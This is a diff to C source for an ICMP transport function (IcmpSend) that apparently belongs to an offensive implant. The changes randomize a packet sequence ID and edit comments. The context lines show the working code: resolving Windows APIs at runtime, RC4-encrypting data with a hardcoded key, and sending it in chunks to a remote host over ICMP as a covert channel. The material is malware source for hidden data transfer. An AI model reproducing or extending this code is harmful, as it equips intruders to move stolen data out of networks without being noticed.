@@ -75,7 +75,7 @@ typedef struct
 
 /* Static */
 #ifndef ICMP_CHUNK_SIZE
-#define ICMP_CHUNK_SIZE			8192
+#define ICMP_CHUNK_SIZE			8192 // note: make me configurable
 #endif
 
 /*!
@@ -148,7 +148,7 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 			if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 ) ) ) {
 				/* Initialize header and sequence packet */
 				Hdr.Signature  = 0xFEFE;
-				Seq.Id         = 0x4343; // change me to random! 
+				Seq.Id         = RandomInt16( );
 				Seq.ChunkTotal = ( ( InLength + ( ICMP_CHUNK_SIZE - 1 ) ) / ICMP_CHUNK_SIZE );
 
 				/* Attempt to send a chunk(s) */
@@ -180,8 +180,8 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 
 						/* Encrypt the buffer & set the key */
 						/* Note: Change from hardcoded! */
-						Key.Length = Key.MaximumLength = 32; // change me to random!
-						Key.Buffer = C_PTR( G_PTR( "N1Ik06XFZtSZj0DguXkwuUIdcs7roZ1S" ) ); // change me to random!
+						Key.Length = Key.MaximumLength = 32; //  note: make me configurable
+						Key.Buffer = C_PTR( G_PTR( "N1Ik06XFZtSZj0DguXkwuUIdcs7roZ1S" ) ); // note: make me configurable
 						Rc4.Length = Rc4.MaximumLength = sizeof( SEQ_PKT ) + InLength;
 						Rc4.Buffer = C_PTR( Sqp );
 
@@ -228,7 +228,6 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 													if ( ( Idx + 1 ) != Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
 														break;
 													};
-													/* Copy Response Over */
 													/* Status */
 													Ret = TRUE;
 												} else {
@@ -282,8 +281,6 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 					Api.IcmpCloseHandle( Icf );
 					Icf = INVALID_HANDLE_VALUE;
 				};
-
-				/* Check response to ensure we have data? or need more? */
 			};
 			/* Dereference */
 			Api.LdrUnloadDll( Icp );
